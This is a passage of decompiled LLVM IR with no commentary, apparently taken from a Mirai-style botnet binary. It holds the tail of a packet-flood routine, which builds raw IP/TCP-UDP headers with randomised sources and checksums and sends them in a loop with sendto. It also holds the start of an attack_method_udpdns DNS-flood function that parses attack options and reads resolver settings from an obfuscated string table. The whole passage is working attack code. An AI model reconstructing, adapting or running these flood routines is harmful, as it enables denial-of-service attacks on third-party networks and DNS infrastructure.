  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, 65280
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v5_a444 = call i32 @llvm.bswap.i32(i32 %v0_a428)
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a4c0 = load i32, i32* @sb, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32 0)
  store i32 %v2_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
